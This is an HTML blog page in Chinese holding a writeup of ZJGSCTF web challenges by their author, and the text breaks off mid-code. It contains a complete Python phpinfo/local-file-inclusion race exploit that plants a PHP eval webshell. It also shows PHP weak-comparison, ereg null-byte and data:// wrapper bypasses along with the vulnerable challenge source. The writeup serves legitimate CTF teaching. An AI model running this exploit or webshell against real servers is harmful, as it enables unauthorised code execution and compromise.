@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>第二届ZJGSCTFWP | Err0r</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="趁着测试题目的机会，把wp一起写掉了吧，如果有大佬黑进来就可以拿到所有的题目了~">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届ZJGSCTFWP">
+<meta property="og:url" content="http://Err0rzz.github.io/2018/05/04/第二届ZJGSCTFWP/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="趁着测试题目的机会，把wp一起写掉了吧，如果有大佬黑进来就可以拿到所有的题目了~">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/Ty2mDpl.png">
+<meta property="og:image" content="https://i.imgur.com/uLPshEp.png">
+<meta property="og:image" content="https://i.imgur.com/zMTsOGL.png">
+<meta property="og:image" content="https://i.imgur.com/FhQgzCl.png">
+<meta property="og:image" content="https://i.imgur.com/5Zjc4Be.png">
+<meta property="og:image" content="https://i.imgur.com/fKnvKUE.png">
+<meta property="og:image" content="https://i.imgur.com/bzGoPJh.png">
+<meta property="og:image" content="https://i.imgur.com/wbZGGZc.png">
+<meta property="og:image" content="https://i.imgur.com/ocBsIqK.png">
+<meta property="og:image" content="https://i.imgur.com/5qlhV9l.png">
+<meta property="og:image" content="https://i.imgur.com/70uVZSA.png">
+<meta property="og:updated_time" content="2018-05-06T14:40:41.824Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第二届ZJGSCTFWP">
+<meta name="twitter:description" content="趁着测试题目的机会，把wp一起写掉了吧，如果有大佬黑进来就可以拿到所有的题目了~">
+<meta name="twitter:image" content="https://i.imgur.com/Ty2mDpl.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.jpg">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Err0rzz</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">壮壮&#39; home</p>
+        
+         <form class="search" method="get" accept-charset="utf-8">
+            <input type="text" id="chillax-search-input" class="st-default-search-input" maxlength="30" placeholder="search" />
+        </form>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives/">个人档案</a></li>
+                        
+                            <li><a href="/links/">友情链接</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">爱游戏爱妹子</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Err0rzz</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Err0rzz</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">壮壮&#39; home</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives/">个人档案</a></li>
+                
+                    <li><a href="/links/">友情链接</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                    
+                        <a class="linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-第二届ZJGSCTFWP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/04/第二届ZJGSCTFWP/" class="article-date">
+      <time datetime="2018-05-04T11:14:29.000Z" itemprop="datePublished">2018-05-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第二届ZJGSCTFWP
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>趁着测试题目的机会，把wp一起写掉了吧，如果有大佬黑进来就可以拿到所有的题目了~</p>
+<a id="more"></a>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="壮壮的网站"><a href="#壮壮的网站" class="headerlink" title="壮壮的网站"></a>壮壮的网站</h2><p>该题还有彩蛋哦~你可以用level2的解法去试试沉迷美色那题~~其实壮壮早就把题目放在外面让大家去做了~</p>
+<p><strong>level 1</strong><br>进入题目，先看到一个登陆界面，而且是<strong>Admin</strong>的登陆界面，所以猜想使用<strong>Admin</strong>账号登陆。<br><img src="https://i.imgur.com/Ty2mDpl.png" alt=""></p>
+<p>仔细审题，发现说摘在博客里备忘，就去博客翻翻吧(<code>算社工吧？</code>)，然后在一篇博客的评论里翻到了密码(<code>这题开始的思路不是这样的，但是为了考虑到此次比赛要友好一点，就用了比较苦力不脑力的方法了</code>)<br><img src="https://i.imgur.com/uLPshEp.png" alt=""><br><br></p>
+<p><strong>level 2</strong><br>登陆上去之后看到一个上传界面<br><img src="https://i.imgur.com/zMTsOGL.png" alt=""><br>仔细审题，发现上传的文件全部不保存，既然这样的话，就不要想什么绕过白名单黑名单了(<code>本来这题连上传界面都可以没有的...</code>)，然后看到界面上大写加粗的<strong>PHPINFO</strong>，想到<strong>phpinfo+本地文件包含</strong>的漏洞，百度一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.cnblogs.com/hiccup/p/5423970.html</div><div class="line">https://blog.csdn.net/qq_21604717/article/details/52357778</div></pre></td></tr></table></figure></p>
+<p>而且出题人也画蛇添足的给了个<code>phpinfo.php</code>，这个页面扫目录的时候也应该扫出来了。接着只需要把别人写好的payload给稍微修改一下路径什么的就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">import threading</div><div class="line">import socket</div><div class="line">def setup(host, port):</div><div class="line">    TAG=&quot;Locale File Include Vulns!!!&quot;</div><div class="line">    PAYLOAD=&quot;&quot;&quot;%s\r\n&lt;?php $c=fopen(&apos;/var/www/adhsdflahsdlfhalmin/Err0r/zz.php&apos;,&apos;w&apos;);fwrite($c,&apos;&lt;?php eval($_POST[&quot;zz&quot;]);?&gt;&apos;);?&gt;\r\n&quot;&quot;&quot; % TAG</div><div class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------68124396905382484903242131\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;test.txt&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Type: text/plain\r\n&quot;&quot;&quot;+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;%s\r\n-----------------------------68124396905382484903242131--&quot;&quot;&quot; % PAYLOAD</div><div class="line">    padding=&quot;A&quot; * 8000</div><div class="line">    REQ1=&quot;&quot;&quot;POST /adhsdflahsdlfhalmin/phpinfo.php?a=%s HTTP/1.1\r\n&quot;&quot;&quot;%padding</div><div class="line">    temp=&quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;%host</div><div class="line">    REQ1 = REQ1+temp</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;User-Agent: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept-Language: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept-Encoding: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Connection: keep-alive\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Type: multipart/form-data; boundary=---------------------------68124396905382484903242131\r\n&quot;&quot;&quot;</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;Content-Length: %s\r\n\r\n&quot;&quot;&quot;%(len(REQ1_DATA))</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;%s&quot;&quot;&quot;%REQ1_DATA</div><div class="line">    #modify this to suit the LFI script</div><div class="line">    LFIREQ=&quot;&quot;&quot;GET /adhsdflahsdlfhalmin/index.php?page=%s HTTP/1.1\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Connection: keep-alive\r\n\r\n&quot;&quot;&quot;</div><div class="line"></div><div class="line">    #print REQ1</div><div class="line">    return (REQ1, TAG, LFIREQ)</div><div class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((host, port))</div><div class="line">    s2.connect((host, port))</div><div class="line"></div><div class="line">    s.send(phpinforeq)</div><div class="line">    d = &quot;&quot;</div><div class="line">    while len(d) &lt; offset:</div><div class="line">        d += s.recv(offset)</div><div class="line">    try:</div><div class="line">        i = d.index(&quot;[tmp_name] =&amp;gt&quot;)</div><div class="line">        fn = d[i+17:i+31]</div><div class="line">        #print fn</div><div class="line">    except ValueError:</div><div class="line">        return None</div><div class="line"></div><div class="line">    s2.send(lfireq % (fn, host))</div><div class="line">    d = s2.recv(4096)</div><div class="line">    s.close()</div><div class="line">    s2.close()</div><div class="line"></div><div class="line">    if d.find(tag) != -1:</div><div class="line">        return fn</div><div class="line"></div><div class="line">counter=0</div><div class="line">class ThreadWorker(threading.Thread):</div><div class="line">    def __init__(self, e, l, m, *args):</div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.event = e</div><div class="line">        self.lock = l</div><div class="line">        self.maxattempts = m</div><div class="line">        self.args = args</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        global counter</div><div class="line">        while not self.event.is_set():</div><div class="line">            with self.lock:</div><div class="line">                if counter &gt;= self.maxattempts:</div><div class="line">                    return</div><div class="line">                counter+=1</div><div class="line">            try:</div><div class="line">                x = phpInfoLFI(*self.args)</div><div class="line">                if self.event.is_set():</div><div class="line">                    break</div><div class="line">                if x:</div><div class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</div><div class="line">                    self.event.set()</div><div class="line"></div><div class="line">            except socket.error:</div><div class="line">                return</div><div class="line"></div><div class="line">def getOffset(host, port, phpinforeq):</div><div class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((host,port))</div><div class="line">    s.send(phpinforeq)</div><div class="line"></div><div class="line">    d = &quot;&quot;</div><div class="line">    while True:</div><div class="line">        i = s.recv(4096)</div><div class="line">        d+=i</div><div class="line">        if i == &quot;&quot;:</div><div class="line">            break</div><div class="line">        # detect the final chunk</div><div class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</div><div class="line">            break</div><div class="line">    s.close()</div><div class="line">    i = d.find(&quot;[tmp_name] =&amp;gt&quot;)</div><div class="line">    if i == -1:</div><div class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</div><div class="line"></div><div class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</div><div class="line">    # padded up a bit</div><div class="line">    return i+256</div><div class="line"></div><div class="line">def main():</div><div class="line">    print &quot;LFI With PHPInfo()&quot;</div><div class="line">    print &quot;-=&quot; * 30</div><div class="line">    if len(sys.argv) &lt; 2:</div><div class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</div><div class="line">        sys.exit(1)</div><div class="line">    try:</div><div class="line">        host = socket.gethostbyname(sys.argv[1])</div><div class="line">    except socket.error, e:</div><div class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</div><div class="line">        sys.exit(1)</div><div class="line">    port=80</div><div class="line">    try:</div><div class="line">        port = int(sys.argv[2])</div><div class="line">    except IndexError:</div><div class="line">        pass</div><div class="line">    except ValueError, e:</div><div class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</div><div class="line">        sys.exit(1)</div><div class="line"></div><div class="line">    poolsz=10</div><div class="line">    try:</div><div class="line">        poolsz = int(sys.argv[3])</div><div class="line">    except IndexError:</div><div class="line">        pass</div><div class="line">    except ValueError, e:</div><div class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</div><div class="line">        sys.exit(1)</div><div class="line"></div><div class="line">    print &quot;Getting initial offset...&quot;,</div><div class="line">    reqphp, tag, reqlfi = setup(host, port)</div><div class="line">    offset = getOffset(host, port, reqphp)</div><div class="line">    sys.stdout.flush()</div><div class="line"></div><div class="line">    maxattempts = 1000</div><div class="line">    e = threading.Event()</div><div class="line">    l = threading.Lock()</div><div class="line"></div><div class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</div><div class="line">    sys.stdout.flush()</div><div class="line"></div><div class="line">    tp = []</div><div class="line">    for i in range(0,poolsz):</div><div class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</div><div class="line">    for t in tp:</div><div class="line">        t.start()</div><div class="line">    try:</div><div class="line">        while not e.wait(1):</div><div class="line">            if e.is_set():</div><div class="line">                break</div><div class="line">            with l:</div><div class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</div><div class="line">                sys.stdout.flush()</div><div class="line">                if counter &gt;= maxattempts:</div><div class="line">                    break</div><div class="line">        print</div><div class="line">        if e.is_set():</div><div class="line">            print &quot;Woot! \m/&quot;</div><div class="line">        else:</div><div class="line">            print &quot;:(&quot;</div><div class="line">    except KeyboardInterrupt:</div><div class="line">        print &quot;\nTelling threads to shutdown...&quot;</div><div class="line">        e.set()</div><div class="line"></div><div class="line">    print &quot;Shuttin&apos; down...&quot;</div><div class="line">    for t in tp:</div><div class="line">        t.join()</div><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+<p>运行结果<br><img src="https://i.imgur.com/FhQgzCl.png" alt=""></p>
+<p>然后就可以连上菜刀了拿到webshell了<br>再安利一波蚁剑这个shell工具，想要的同学可以私聊~<br><br><br><strong>level 3</strong><br>然后会在<code>/var/</code>目录下发现一个flag.so，你以为是逆向？不~其实还是web。<br>这里是跟mysql的udf有关，具体可以看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://err0rzz.github.io/2017/12/26/UDF-mysql/</div></pre></td></tr></table></figure></p>
+<p>然后根据该题另一个文件tips提示的函数，就可以拿到flag了~<br><img src="https://i.imgur.com/5Zjc4Be.png" alt=""><br><img src="https://i.imgur.com/fKnvKUE.png" alt=""></p>
+<p><br><br>出题人的心路历程：其实这题可以出的更加漂亮一点的，主要还是出题人水平不够+时间不够。按照原本的打算，是想第一关注入拿到合法用户的账号密码(不一定是admin)，然后在用户的界面设立一个上传点。拿到shell之后因为在www-data用户的权限下，所以需要提权到root权限，用udf来进行提权(一开始想用Ubuntu本地提权CVE-2017-16995，但是发现被潘大佬用在了pwn题上)，下面是udf提权过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://bbs.ichunqiu.com/thread-39697-1-1.html</div></pre></td></tr></table></figure></p>
+<p>但是由于时间问题，就没有完善，没有模拟出一套完整的渗透过程–拿账号、拿shell、提权，弄成了社工、拿shell、假装提权，强行凑在一起了</p>
+<p>主要还是希望大家能学到这些知识点。。而且，大家没事干可以复现一下这些漏洞玩玩，可以做的比我更好的~<br><br></p>
+<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>该题基本上全是php黑魔法，右键都能看到源码，参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.cnblogs.com/xishaonian/p/7628152.html</div><div class="line">https://www.jianshu.com/p/d433d9f89102</div></pre></td></tr></table></figure></p>
+<p><strong>level 1</strong><br>练习题也出过，两个等号的弱比较，输入<code>240610708</code>，进入下一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if(isset($_POST[&apos;zz&apos;]))&#123;</div><div class="line">$_1=$_POST[&apos;zz&apos;];</div><div class="line">if($_1!=&apos;QNKCDZO&apos;&amp;&amp;md5($_1)==md5(&apos;QNKCDZO&apos;))&#123;</div><div class="line">	$_SESSION[&apos;level2&apos;]=1;</div><div class="line">	header(&apos;location:./level2/index.php&apos;);</div><div class="line">&#125;</div><div class="line">else </div><div class="line">	header(&apos;location:./index.php&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 2</strong><br><code>PS:主要的加载js就是那根光柱呢~</code><br>这题好像又是出题人的锅。。应该是<strong>tmp[$_2]!=’v’</strong>，这样的话有些人输入4就不能通过了。原本是想让大家输入<strong>.4e1</strong>来绕过的，这是个科学计数法所以能过if判断的第一个。然后第二个判断的时候<strong>.</strong>是个字符串，所以一整串会被转化成0<br><img src="https://i.imgur.com/bzGoPJh.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if($_SESSION[&apos;level2&apos;]==1)&#123;</div><div class="line">	if(isset($_POST[&apos;zz&apos;]))&#123;</div><div class="line">	$_2=$_POST[&apos;zz&apos;];</div><div class="line">	$tmp=&quot;I Love U&quot;;</div><div class="line">	if($_2==4&amp;&amp;$tmp[$_2]!=&apos;o&apos;)&#123;</div><div class="line">		$_SESSION[&apos;level3&apos;]=1;</div><div class="line">		header(&apos;location:./level3/index.php&apos;);</div><div class="line">	&#125;</div><div class="line">	else </div><div class="line">		header(&apos;location:./index.php&apos;);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">else </div><div class="line">	echo &quot;&lt;script&gt; alert(&apos;Do not be silly!&apos;);parent.location.href=&apos;../index.php&apos;; &lt;/script&gt;&quot;;</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p><strong>level 3</strong><br>题目有三层验证：<br>第一层是用ereg函数来正则匹配是否含有ZJGSCTF几个字，不含有再进入第二层。<br>第二层用strpos验证是否含有ZJGSCTF，含有再进入第三层。<br>第三层需要输出的东西长度小于15，同时大于99999999999999999</p>
+<p>第一层和第二层明显矛盾了，但是ereg存在<strong>%00截断漏洞</strong>，即匹配到%00就不再继续匹配下去了，所以第一层第二层验证可以绕过。</p>
+<p>然后第三层的话，可以用科学计数法来绕过。</p>
+<p>所以最后输入<code>1e20%00ZJGSCTF</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if($_SESSION[&apos;level3&apos;]==1)&#123;</div><div class="line">	</div><div class="line">	if(isset($_POST[&apos;zz&apos;]))&#123;</div><div class="line">	$_3=$_POST[&apos;zz&apos;];</div><div class="line">	if (ereg (&quot;^[ZJGSCTF]+$&quot;,$_3) === TRUE)    </div><div class="line">	    header(&apos;location:./index.php&apos;);</div><div class="line">	else &#123;</div><div class="line">		if(strpos ($_3, &apos;ZJGSCTF&apos;) === FALSE)</div><div class="line">			header(&apos;location:./index.php&apos;);</div><div class="line">		else &#123;</div><div class="line">			if(strlen($_3)&lt;15&amp;&amp;$_3&gt;99999999999999999)&#123;</div><div class="line">				$_SESSION[&apos;level4&apos;]=1;</div><div class="line">				header(&apos;location:./level4/index.php&apos;);</div><div class="line">			&#125;</div><div class="line">			else </div><div class="line">				header(&apos;location:./index.php&apos;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">else </div><div class="line">		echo &quot;&lt;script&gt; alert(&apos;Do not be silly!&apos;);parent.location.href=&apos;../../index.php&apos;; &lt;/script&gt;&quot;;</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 4</strong><br>这题如果正常的输入文件名，然后用file_get_contents去读取文件是没法做的，所以需要用<code>data伪协议</code>绕过<a href="http://cn2.php.net/manual/zh/wrappers.data.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.data.php</a>，或者用<code>php://input</code>也可以<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">zz=data://text/plain;base64,WkpHU0NURiBpcyBpbnRlcmVzdGluZyE=</div></pre></td></tr></table></figure></p>
+<p>就可以绕过拿到flag了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">if($_SESSION[&apos;level4&apos;]==1)&#123;</div><div class="line">	</div><div class="line">	if(isset($_POST[&apos;zz&apos;]))&#123;</div><div class="line">	$_4=$_POST[&apos;zz&apos;];</div><div class="line"></div><div class="line">	if(stripos($_4,&apos;.&apos;))</div><div class="line">		header(&apos;location:./index.php&apos;);</div><div class="line"></div><div class="line">	$data = @file_get_contents($_4,&apos;r&apos;);</div><div class="line">	if($data==&quot;ZJGSCTF is interesting!&quot;)&#123;</div><div class="line">		$_SESSION[&apos;flag&apos;]=1;</div><div class="line">		sleep(1.5);</div><div class="line">		header(&apos;location:./flag.php&apos;);</div><div class="line">	&#125;</div><div class="line">	else </div><div class="line">		header(&apos;location:./index.php&apos;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">else </div><div 